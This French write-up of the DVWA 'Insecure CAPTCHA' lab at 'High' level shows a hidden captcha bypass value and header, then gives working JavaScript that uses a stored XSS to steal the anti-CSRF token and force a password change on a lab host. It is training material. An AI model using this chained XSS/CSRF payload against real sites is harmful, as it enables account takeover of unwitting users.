# Niveau "High"

Quelles nouveautés pour ce niveau "High" ? :

![](../../../../.gitbook/assets/0b72ddd77825da73b7eb9dae362be3ce.png)

Ici pas d'étape de confirmation, le changement du mot de passe est directement effectué :

![](../../../../.gitbook/assets/de31571ab16a1a06442e7a913a15f3e3.png)

La seule requête effectuée est la suivante :

![](../../../../.gitbook/assets/01223a528799368e5faf595dae961622.png)

On identifie rapidement la présence d'un jeton anti-CSRF nommé `user_token`, mais plus intéressant ici, la réponse contient un commentaire HTML :

![](../../../../.gitbook/assets/7b78c6fe35530fd199e1e35cd62be202.png)

Il s'agit sans doute d'un contournement mis en place par le développeur afin de tester sa feature sans avoir à résoudre le Captcha. On forge donc une requête dont la valeur du Captcha \(le paramètre `g-recaptcha-response` \) est `hidd3n_valu3` ainsi qu'un entête `User-Agent` possédant la valeur `reCAPTCHA` :

![](../../../../.gitbook/assets/eb6728607b08ade78bea2c5b6c3aac1c.png)

Le changement du mot de passe fonctionne :

![](../../../../.gitbook/assets/9dcf8b33e9273a14a2e8452ac9c9604a.png)

A cause de la présence du jeton anti-CSRF il nous faut exploiter une faille XSS sur l'application cible afin de récupérer un jeton puis seulement effectuer l'attaque CSRF.

{% hint style="info" %}
Pour cela, le challenge XSS Stored sera utilisé et l'injection se fera en niveau "Low". Par contre, il ne faudra pas oublier de repasser en niveau "High" pour l'exploitation du contournement du Captcha.
{% endhint %}

Voici la première requête **`XHR`** :

```javascript
var xhr = new XMLHttpRequest();
xhr.open('GET', 'http://192.168.56.203/vulnerabilities/captcha/', true);
xhr.withCredentials = true;
xhr.responseType = "document";

xhr.onload = function () {
    var token = xhr.response.getElementsByName('user_token')[0].value;
               
    // Ici la seconde requête
};

xhr.send();
```

Une fois le jeton récupéré, la seconde requête effectuée sera :

```javascript
var xhr2 = new XMLHttpRequest();
xhr2.open("POST", 'http://192.168.56.203/vulnerabilities/captcha/', true);
xhr2.setRequestHeader("User-Agent", "reCAPTCHA");
xhr2.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
xhr2.withCredentials = true;

xhr2.send("step=1&password_new=hacked&password_conf=hacked&g-recaptcha-response=hidd3n_valu3&user_token="+token+"&Change=Change");
```



L'exploitation de la vulnérabilité ne fonctionne pas sous Chrome \(testée sur la version 78\), car le navigateur interdit la modification de l'entête `User-Agent` :

![](../../../../.gitbook/assets/fbdd68937e48a4a534ac40448edf36a2.png)

Mais cela fonctionne sur Firefox \(testée sur la version 70\) :

![](../../../../.gitbook/assets/bf87cb7197d49a0befe9976b80d25cef.png)

